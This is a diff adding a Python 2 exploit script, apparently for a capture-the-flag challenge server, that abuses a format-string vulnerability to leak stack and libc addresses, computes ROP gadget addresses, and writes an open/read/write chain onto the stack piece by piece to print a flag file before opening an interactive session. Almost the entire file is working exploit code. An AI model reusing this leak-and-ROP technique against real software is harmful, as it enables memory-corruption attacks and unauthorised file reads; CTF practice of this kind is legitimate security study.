@@ -1,0 +1,123 @@
+#!/usr/bin/env python2
+
+import sys
+from libformatstr import FormatStr
+from trmr import *
+
+#HOST = "172.16.12.143"
+#PORT = 1025
+
+HOST = "ctfq.sweetduet.info"
+PORT = 10001
+
+
+'''
+# for local (/lib/i386-linux-gnu/libc.so.6)
+open_offset = 0xd56e0
+read_offset = 0xd5af0
+write_offset = 0xd5b60
+pop3ret_offset = 0x133e5b
+pop2ret_offset = 0x2f974
+flag = "flag.txt"
+data_addr = 0
+call_main_offset = 0xf7
+libc_main_addr = 0x18540
+#0x0002f974: xor eax, ebx ; pop ebx ; pop esi ; ret  ;  (1 found)
+#0x00133e5b: pop esi ; pop edi ; pop ebx ; ret  ;  (2 found)
+'''
+
+#for remote (given libc.so.6)
+open_offset = 0xd24a0
+read_offset = 0xd2920
+write_offset = 0xd29a0
+pop3ret_offset =  0x12db2f
+pop2ret_offset = 0xf2d7c
+flag = "/home/q23/flag.txt"
+libc_main_addr = 0x16c40
+call_main_offset = 0xe6
+#0x0012db2f: pop esi ; pop edi ; pop ebx ; ret  ;  (2 found)
+#0x000f2d7c: pop ebx ; pop edx ; ret  ;  (1 found)
+
+print "[+] Caluculating addresses..."
+s, f = sock(HOST, PORT)
+read_until(f, "name?\n")
+f.write("/%78$p/%91$p"+"\n")
+r = read_until(f, "\n").rstrip().split('/')
+
+old_ebp = int(r[1],16)
+rtn_main_addr = int(r[2], 16)
+libc_base_addr = rtn_main_addr - call_main_offset - libc_main_addr
+
+open_addr = libc_base_addr + open_offset
+read_addr = libc_base_addr + read_offset
+write_addr = libc_base_addr + write_offset
+pop3ret_addr = libc_base_addr + pop3ret_offset
+pop2ret_addr = libc_base_addr + pop2ret_offset
+
+print "[*] libc_base_addr: ",hex(libc_base_addr)
+print "[*] libc_open_addr: ",hex(open_addr)
+print "[*] libc_read_addr: ",hex(read_addr)
+print "[*] libc_write_addr: ",hex(write_addr)
+print "[*] libc_pop3ret_addr: ",hex(pop3ret_addr)
+print "[*] libc_pop2ret_addr: ",hex(pop2ret_addr)
+
+print "[+] Done."
+print ""
+
+len_payload_without_flag = 56
+#len_payload = 36
+
+'''
+# open(flag, 0)
+payload = p(open_addr) + p(pop3ret_addr) + p(old_ebp + len_payload_without_flag + 4) + p(0) + p(0)
+
+# read(3, buf, 255)
+payload += p(read_addr) + p(pop3ret_addr) + p(3) + p(old_ebp + len_payload_without_flag + 4) + p(255)
+
+# write(STDOUT, buf, 255)
+payload += p(write_addr) + p(pop3ret_addr) + p(1) + p(old_ebp + len_payload_without_flag + 4) + p(255)
+
+#print len(payload) -> 60
+payload += flag
+'''
+
+payload = [
+    p(open_addr),
+    p(pop2ret_addr),
+    p(old_ebp + len_payload_without_flag + 4),
+    p(0),
+    p(read_addr),
+    p(pop3ret_addr),
+    p(3),
+    #p(5), #for using socat
+    p(old_ebp + len_payload_without_flag + 4),
+    p(255),
+    p(write_addr),
+    p(pop3ret_addr),
+    p(1),
+    p(old_ebp + len_payload_without_flag + 4),
+    p(255),
+    #"flag.txt"
+    "/home/q23/flag.txt" + p(0)
+]
+
+len_payload = len(payload)
+
+print "[+] Sending payloads..."
+#payload = "AABBBBBB"
+print "[*] num of rounds: ", len_payload
+#print "open: ",hex(u(payload[0]))
+
+# for stack space, split payload
+for i in range(len_payload):
+    print "[*] Round: ",i
+    read_until(f, "name?\n")
+    p = FormatStr()
+    p[old_ebp+4 + 4*i] = payload[i]
+    f.write(p.payload(7)+"\n")
+
+print read_until(f, "name?\n")
+f.write("\n")
+print read_line(f)
+interact(s)
+
